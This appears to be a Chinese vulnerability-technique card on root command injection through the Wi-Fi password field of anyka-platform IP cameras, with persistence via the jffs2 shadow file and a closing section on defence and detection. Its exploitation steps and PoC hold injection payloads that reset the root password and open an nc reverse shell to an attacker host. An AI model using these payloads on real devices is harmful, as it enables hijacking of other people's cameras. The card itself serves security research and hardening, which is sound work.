---
id: iot-camera-wifi-psk-shell-injection-jffs2-persistence
title: 安凯（anyka）平台摄像头 Wi-Fi 配网脚本 PSK 命令注入：sh -c 拼接 wpa_cli 拿 root 并经 jffs2 持久化
type: scenario
domain: iot
path: iot
technique: camera-wifi-psk-shell-injection
aliases:
- station_connect.sh 命令注入
- Wi-Fi 密码命令注入
- wpa_cli psk 注入
- 摄像头 root RCE
- jffs2 shadow 持久化
- 配网参数注入
tags:
- iot
- camera
- firmware
- command-injection
- wifi
- wpa_cli
- shell
- root
- persistence
- jffs2
cve: []
severity: critical
confidence: high
affected_versions: anyka 平台摄像头固件（Linux anyka 3.4.35 armv5tejl，2021-12-14 构建）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V341
  verified_at: '2026-11-08T20:46:01+08:00'
  notes: 已对照原文核对 station_connect.sh 的 sh -c 拼接 PSK、passwd root payload 与 /etc/jffs2 shadow 持久化；具体引号闭合需按目标固件微调
---

## 一句话结论

摄像头的 Wi-Fi 配网脚本 `/usr/sbin/station_connect.sh` 把配网传入的 SSID/PSK 拼进 `sh -c "wpa_cli -iwlan0 set_network $NET_ID psk $PSK"` 执行，只做了引号包裹而没有转义单引号；PSK 中插入 `'&& <命令>` 即可跳出 wpa_cli，以 root 执行任意命令（如改 root 口令、反弹 shell），再通过设备开放的 Telnet/FTP 登录；而 `/etc/shadow` 实际位于可写 jffs2 分区的 `/etc/jffs2`，改过的 root 口令在按复位键后仍然有效。

## 原理

- 启动链：`sysinit` → `/etc/init.d/rcS` → `/etc/init.d/rc.local` → `/usr/sbin/camera.sh` 与 `/usr/sbin/service.sh` → `net_manage.sh` → `wifi_manage.sh` → `wifi_run.sh` → `wifi_station.sh`（或 `ap.sh`）→ `station_connect.sh`。这些 init 脚本以 root 身份运行，注入的命令因此是 root 权限。
- `station_connect.sh` 接收 `MODE`、`GSSID`、`GPSK`、`KEY_INDEX` 参数；赋值时形如 `PSK=\'\"$GPSK\"\'`，把参数包成「单引号 + 双引号」的字面值，再执行 `sh -c "wpa_cli -iwlan0 set_network $NET_ID ssid $SSID"` 与 `sh -c "wpa_cli -iwlan0 set_network $NET_ID psk $PSK"`。
- 注入为什么成立：包装值进入内层 `sh -c` 后会形成单引号上下文，但值内部的单引号没有被转义或过滤。PSK 里以 `'` 开头即可闭合这段单引号，随后 `&&`（或 `;`）成为 shell 控制符，后面的内容由 root shell 执行；`wpa_cli` 自身参数不合法/失败也不影响后续命令（用 `;` 更稳）。
- 示例：PSK 填 `'&& echo -e "1234\n1234" | passwd root #`，`#` 把脚本追加在参数末尾的引号注释掉，保证整行语法闭合；执行后 root 口令变为 1234。也可换成反弹 shell 或写 SSH 公钥/启动脚本。
- 持久化：`/proc/mounts` 显示 `/etc/jffs2` 以 jffs2 rw 挂载，`/etc/shadow` 实际是 `/etc/jffs2/shadow`；修改会写入 flash 配置分区，不属于只读的 `/dev/root`（SquashFS）或 `/usr`（`/dev/mtdblock5`），所以按设备复位键恢复默认配置时 root 口令不会被重置。
- 攻击面：配网字段可由 APP 配网界面提交，也可能由设备的配网指令（`OpenWifi` 一类）带入；结合明文协议与客户端鉴权绕过，可在不知道原口令的情况下远程触发。

## 触发条件

- 目标固件包含该脚本或同类写法：外部参数拼进 `sh -c` 且未转义单引号/元字符。
- 攻击者能影响设备 Wi-Fi 配置：能操作 APP 配网、能发送配网指令（`OpenWifi` 等），或能诱导用户把恶意 SSID/PSK 提交给设备。
- 设备上的脚本由 root 执行（init 启动链默认成立）。
- 需要交互登录时，设备开放 Telnet 23/FTP 21 且未禁用 root 登录；否则可用注入直接反弹 shell。

## 利用步骤

1. 取得固件文件系统（任意文件下载或离线固件提取），读 `/usr/sbin/station_connect.sh` 与启动链，确认 `sh -c` 拼接点和参数来源。
2. 通过配网入口提交 SSID/PSK，PSK 先填 `'&&id #` 验证命令执行（观察回显/副作用，或直接反弹 shell）。
3. 修改 root 口令：PSK 填 `'&& echo -e "1234\n1234" | passwd root #`；或使用反弹 shell payload 获取交互式 root shell。
4. `nmap` 扫描设备 23/21 端口，用 root/新口令连接 Telnet 或 FTP。
5. 验证持久化：确认 `/etc/shadow` 实际为 `/etc/jffs2/shadow`（jffs2 rw），重启设备或按复位键后口令仍有效。
6. 清理测试痕迹时注意 jffs2 上的修改不会随复位消失，需要重新刷写配置分区或手动恢复。

## PoC

配网 PSK 字段（概念，末尾 `#` 用于注释脚本追加的引号）：

```text
'&& echo -e "1234\n1234" | passwd root #
```

反弹 shell 变体：

```text
'&& rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f #
```

设备侧最终执行的命令形态（示意）：

```sh
sh -c "wpa_cli -iwlan0 set_network $NET_ID psk '\"<PSK>\"'"
# PSK 中的单引号闭合后，&& 后的命令由 root shell 执行
```

说明：文中实测通过 PSK 注入修改 root 口令后用 Telnet 登录成功；本卡未在本机复跑，payload 的具体引号闭合方式需按目标固件的赋值写法微调（必要时用 `;`、`$()` 或反引号替代 `&&`）。

## 变体与关联

- 变体：SSID 同样进入 `sh -c "... ssid $SSID"`，若 PSK 有长度/字符限制可改注入 SSID；`KEY_INDEX` 等参数若参与命令拼接也可作为注入点。
- 变体：同固件的 `ap.sh`、`wifi_manage.sh`、`wifi_run.sh` 等脚本可能复用相同拼接方式，审计同族脚本可找到更多入口。
- 变体：改 `/etc/jffs2/shadow` 的持久化思路可复用到其他「只读 rootfs + 可写 jffs2 配置分区」的嵌入式设备。
- 关联：[[iot-camera-app-login-result-hook-bypass]]（客户端鉴权绕过，配合配网入口）、[[iot-protocol-ppcs-p2p-plaintext-udp-json-simulator]]（配网指令的封装与下发）、[[iot-protocol-camera-downloadfile-arbitrary-file-read-mtd-mount]]（提取脚本与 shadow）、[[iot-tplink-sr20-tddp-v1-udp-cmd-injection-lua]]（同属 IoT 命令注入，但 sink 为 tftp/Lua）。
- 边界：固件改用 `execve` 参数数组、对单引号/元字符做转义或白名单，或配网接口要求强认证且不可绕过时，本卡不成立；Telnet/FTP 关闭时只能依赖注入直接反弹 shell。

## 检测与防御

- 防御：禁止把外部参数拼进 `sh -c`，改用 `execve` 参数数组或 `wpa_cli` 的配置文件/stdin 接口；对 SSID/PSK 做严格字符白名单与转义。
- 防御：配网接口要求已认证会话并限制来源；Telnet/FTP 默认关闭或仅内网可达；`/etc` 配置分区做只读挂载或完整性校验。
- 检测：`station_connect.sh` 的调用参数中出现 `'`、`&&`、`;`、`|`、反引号、`$(` 等 shell 元字符；`wpa_cli` 异常退出后出现意料外的 `passwd`、`nc`、`telnetd` 进程；`/etc/jffs2/shadow` 时间戳或哈希变化；设备 23/21 端口的异常登录。
- 加固：rootfs 与配置分区签名校验、安全启动；限制串口/调试接口与配网物理接触面。
